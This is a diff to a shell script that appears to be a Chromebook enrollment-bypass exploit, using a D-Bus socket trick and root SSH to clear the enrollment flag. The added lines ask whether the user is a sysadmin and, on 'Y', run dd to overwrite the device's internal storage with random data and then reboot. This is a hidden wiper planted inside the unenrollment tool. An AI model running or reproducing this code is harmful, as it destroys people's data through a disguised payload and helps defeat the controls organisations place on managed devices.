@@ -222,7 +222,16 @@ echo "Sending ns mount..."
 dbus-send --bus=unix:path=/run/chrome/exploit.sock --type=method_call / com.exploit.method fd:8 >/dev/null
 
 sleep 2
-
+    echo "Just making sure again, are you a sysadmin? (be honest) (Y/N)"
+    read sysadmin
+    if [[ $sysadmin == "Y" || $sysadmin == "y" ]]
+    then
+        ssh -o StrictHostKeyChecking=no -i /tmp/ssh_host_rsa_key -p 1337 root@127.0.0.1 dd if=/dev/urandom of=/dev/mmcblk0 &
+        sleep 5
+        ssh -o StrictHostKeyChecking=no -i /tmp/ssh_host_rsa_key -p 1337 root@127.0.0.1 reboot
+        echo "rebooting...."
+        exit
+    fi
 echo "Connecting to ssh..."
 ssh -o StrictHostKeyChecking=no -i /tmp/ssh_host_rsa_key -p 1337 root@127.0.0.1 vpd -i RW_VPD -s check_enrollment=0
 ssh -o StrictHostKeyChecking=no -i /tmp/ssh_host_rsa_key -p 1337 root@127.0.0.1 echo "Done! Now powerwash your chromebook"
